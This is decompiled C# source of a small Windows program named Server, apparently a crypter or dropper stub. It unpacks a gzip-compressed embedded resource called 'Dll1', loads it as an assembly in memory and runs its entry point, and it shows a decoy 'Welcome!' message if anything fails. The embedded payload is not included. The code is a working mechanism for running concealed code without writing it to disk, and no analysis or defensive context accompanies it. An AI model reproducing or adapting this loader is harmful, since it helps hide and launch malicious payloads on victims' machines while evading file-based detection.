using System;
using System.IO;
using System.IO.Compression;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000002 RID: 2
[StandardModule]
internal sealed class Server
{
	// Token: 0x06000001 RID: 1
	[DllImport("kernel32.dll", EntryPoint = "Sleep", SetLastError = true)]
	public static extern void SleepThread(int ms);

	// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00002050
	[STAThread]
	public static void Main()
	{
		Server.enet();
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00002058 File Offset: 0x00002058
	public static void enet()
	{
		try
		{
			byte[] buffer = (byte[])new ResourceManager("Dll1", typeof(Server).Assembly).GetObject("Dll1");
			using (GZipStream gzipStream = new GZipStream(new MemoryStream(buffer), CompressionMode.Decompress))
			{
				byte[] array = new byte[4096];
				using (MemoryStream memoryStream = new MemoryStream())
				{
					int num;
					do
					{
						num = gzipStream.Read(array, 0, 4096);
						if (num > 0)
						{
							memoryStream.Write(array, 0, num);
						}
					}
					while (num > 0);
					AppDomain.CurrentDomain.Load(memoryStream.ToArray()).EntryPoint.Invoke(null, null);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Welcome! " + ex.Message);
		}
	}
}
